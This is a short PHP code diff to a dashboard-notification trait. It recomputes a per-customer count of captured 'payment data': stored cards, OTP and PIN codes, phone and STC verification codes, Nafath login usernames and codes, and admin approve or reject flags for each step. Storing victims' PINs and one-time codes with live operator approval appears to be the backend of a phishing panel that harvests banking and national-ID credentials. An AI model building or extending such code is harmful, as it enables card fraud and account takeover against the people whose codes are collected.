@@ -69,10 +69,18 @@ trait NotifiesDashboard
 
             $viewed = $customer->data_viewed ?? [];
 
-            // Re-compute payment count
+            // Re-compute payment count — must match AdminCustomerController::countPaymentData()
             $count = $customer->paymentCards->count()
-                + $customer->otpCodes->where('type', 'otp')->count()
-                + $customer->otpCodes->where('type', 'pin')->count();
+                + $customer->otpCodes->whereIn('type', ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification'])->count();
+            if ($customer->nafath_username || $customer->nafath_verification_code) {
+                $count++;
+            }
+            $extra = $customer->extra_data ?? [];
+            if (! empty($extra['stc_waiting_approved']) || ! empty($extra['stc_waiting_rejected'])) $count++;
+            if (! empty($extra['stc_otp_approved']) || ! empty($extra['stc_otp_rejected'])) $count++;
+            if (! empty($extra['stc_call_approved']) || ! empty($extra['stc_call_rejected'])) $count++;
+            if (! empty($extra['phone_data_status'])) $count++;
+            if (! empty($extra['phone_otp_status'])) $count++;
 
             // Re-compute payment hash (must match AdminCustomerController::computeSectionHash)
             $hashValues = [
